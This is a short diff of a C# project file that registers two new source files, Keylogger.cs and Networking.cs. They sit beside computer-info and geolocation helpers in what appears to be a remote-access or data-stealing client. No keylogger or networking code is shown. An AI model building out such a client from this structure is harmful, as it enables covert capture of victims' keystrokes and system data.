@@ -61,6 +61,8 @@
   <ItemGroup>
     <Compile Include="InformationHelpers\ComputerInfo.cs" />
     <Compile Include="InformationHelpers\GeoInfo.cs" />
+    <Compile Include="InformationHelpers\Keylogger.cs" />
+    <Compile Include="InformationHelpers\Networking.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="ClientSettings.cs" />
